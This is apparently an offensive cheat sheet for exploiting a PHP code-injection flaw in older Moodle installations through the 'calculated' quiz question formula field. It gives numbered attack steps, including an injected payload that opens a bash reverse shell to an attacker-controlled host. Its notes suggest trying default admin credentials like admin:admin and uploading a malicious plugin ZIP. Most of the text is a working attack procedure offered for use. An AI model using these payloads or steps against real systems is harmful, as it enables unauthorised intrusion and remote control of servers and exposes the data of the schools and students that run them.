# Moodle preg_replace RCE

Moodle before 3.x versions allow an authenticated teacher/manager to execute PHP code via the quiz "calculated question" feature, which uses `preg_replace` with the `/e` modifier (deprecated in PHP 5.5, removed in PHP 7). The formula field evaluates PHP code.

## Steps

```
1. Log in as teacher or admin
2. Navigate to a course → Add Quiz activity
3. Add a "Calculated" question type
4. In the answer formula field, inject PHP:
   system('id')
   or
   passthru('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')
5. Save and preview the question to trigger execution
```

## Notes
- Requires teacher, manager, or admin role
- Affected on PHP < 7.0 (preg_replace /e modifier available)
- Moodle path: `/moodle/` or `/` depending on installation
- Default admin creds sometimes: `admin:admin` or guessable from username hints
- Also check: `Moodle → Site admin → Server → System paths` for writable config
- Alternative: Admin panel → Plugin manager → upload malicious plugin ZIP
